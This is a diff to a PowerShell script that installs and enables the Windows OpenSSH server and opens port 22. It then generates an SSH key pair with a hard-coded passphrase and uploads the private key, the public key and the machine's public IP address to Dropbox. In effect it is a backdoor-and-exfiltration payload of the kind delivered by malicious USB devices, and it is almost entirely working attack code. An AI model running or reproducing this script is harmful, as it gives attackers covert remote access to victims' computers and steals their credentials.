@@ -1,13 +1,16 @@
+# Installing SSH Service
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
+# Confirm the Firewall rule is configured. It should be created automatically by setup. Run the following to verify
 if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
     Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
     New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
 } else {
     Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
 }
-ssh-keygen
-dropbox-upload.ps1
+
+ssh-keygen -f 'C:\gf\key' -N 'ghostfusion'
   
 function DropBox-Upload {
 
@@ -29,11 +32,12 @@ $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
-$filename = "$env:USERPROFILE\.ssh\id_rsa"
-$pub = "$env:USERPROFILE\.ssh\id_rsa.pub"
+
+$filename = "c:\gf\key"
+$pub = "C:\gf\key.pub"
+$currentip = Invoke-RestMethod -uri (“https://api.ipify.org/”)
+$currentip | Out-File "C:\ip-$currentip.txt"
 
 DropBox-Upload -FileName $filename
 DropBox-Upload -FileName $pub
-$currentip = Invoke-RestMethod -uri (“https://api.ipify.org/”)
-$currentip | Out-File "C:\ip-$currentip.txt"
 DropBox-Upload -FileName "C:\ip-$currentip.txt"
